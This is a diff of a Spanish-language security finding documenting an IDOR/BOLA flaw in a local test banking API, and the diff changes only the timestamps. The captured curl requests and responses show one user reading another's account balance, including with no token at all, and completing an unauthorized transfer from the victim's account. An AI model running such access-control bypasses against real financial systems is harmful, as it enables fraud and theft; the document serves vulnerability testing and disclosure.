@@ -1,5 +1,5 @@
 # HALLAZGO-02 - IDOR/BOLA en consulta de cuentas, saldo y transferencias
-Fecha de ejecucion: 2026-11-17 09:24:45
+Fecha de ejecucion: 2026-11-17 09:38:51
 Atacante: carlos_mora (propietario de la cuenta ID 2). Victima: maria_rojas (cuenta ID 3).
 
 ### Consulta de cuenta ajena (ID 3) con token de Carlos
@@ -11,7 +11,7 @@ Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 Content-Type: application/json
 Transfer-Encoding: chunked
-Date: Tue, 17 Nov 2026 15:24:45 GMT
+Date: Tue, 17 Nov 2026 15:38:50 GMT
 
 {"id":3,"usuarioId":4,"titular":"María Rojas Soto","numeroCuenta":"CR05015202001026458902","tipoCuenta":"CORRIENTE","saldo":4850000.00,"moneda":"CRC","activa":true}
 
@@ -24,9 +24,9 @@ Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 Content-Type: application/json
 Transfer-Encoding: chunked
-Date: Tue, 17 Nov 2026 15:24:45 GMT
+Date: Tue, 17 Nov 2026 15:38:50 GMT
 
-{"timestamp":"2026-11-17T15:24:45.992+00:00","status":404,"error":"Not Found","trace":"org.springframework.web.servlet.resource.NoResourceFoundException: No static resource api/cuentas/3/saldo.\r\n\tat org.springframework.web.servlet.resource.ResourceHttpRequestHandler.handleRequest(ResourceHttpRequestHandler.java:585)\r\n\tat org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter.handle(HttpRequestHandlerAdapter.java:52)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(D
+{"timestamp":"2026-11-17T15:38:51.342+00:00","status":404,"error":"Not Found","trace":"org.springframework.web.servlet.resource.NoResourceFoundException: No static resource api/cuentas/3/saldo.\r\n\tat org.springframework.web.servlet.resource.ResourceHttpRequestHandler.handleRequest(ResourceHttpRequestHandler.java:585)\r\n\tat org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter.handle(HttpRequestHandlerAdapter.java:52)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089)\r\n\tat org.springframework.web.servlet.DispatcherServlet.doService(D
 
 ### Consulta sin token (ID 3)
 $ curl -i http://localhost:8080/api/cuentas/3
@@ -37,7 +37,7 @@ Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 Content-Type: application/json
 Transfer-Encoding: chunked
-Date: Tue, 17 Nov 2026 15:24:45 GMT
+Date: Tue, 17 Nov 2026 15:38:50 GMT
 
 {"id":3,"usuarioId":4,"titular":"María Rojas Soto","numeroCuenta":"CR05015202001026458902","tipoCuenta":"CORRIENTE","saldo":4850000.00,"moneda":"CRC","activa":true}
 
@@ -50,6 +50,6 @@ Vary: Access-Control-Request-Method
 Vary: Access-Control-Request-Headers
 Content-Type: application/json
 Transfer-Encoding: chunked
-Date: Tue, 17 Nov 2026 15:24:45 GMT
+Date: Tue, 17 Nov 2026 15:38:50 GMT
 
-{"id":5,"cuentaOrigenId":3,"numeroCuentaOrigen":"CR05015202001026458902","titularOrigen":"María Rojas Soto","cuentaDestinoId":2,"numeroCuentaDestino":"CR05015202001026458901","titularDestino":"Carlos Mora Morales","monto":100000,"conceptoHtml":"Retiro no autorizado","fecha":"2026-11-17T09:24:46.1108879","estado":"COMPLETADA"}
+{"id":5,"cuentaOrigenId":3,"numeroCuentaOrigen":"CR05015202001026458902","titularOrigen":"María Rojas Soto","cuentaDestinoId":2,"numeroCuentaDestino":"CR05015202001026458901","titularDestino":"Carlos Mora Morales","monto":100000,"conceptoHtml":"Retiro no autorizado","fecha":"2026-11-17T09:38:51.4886477","estado":"COMPLETADA"}
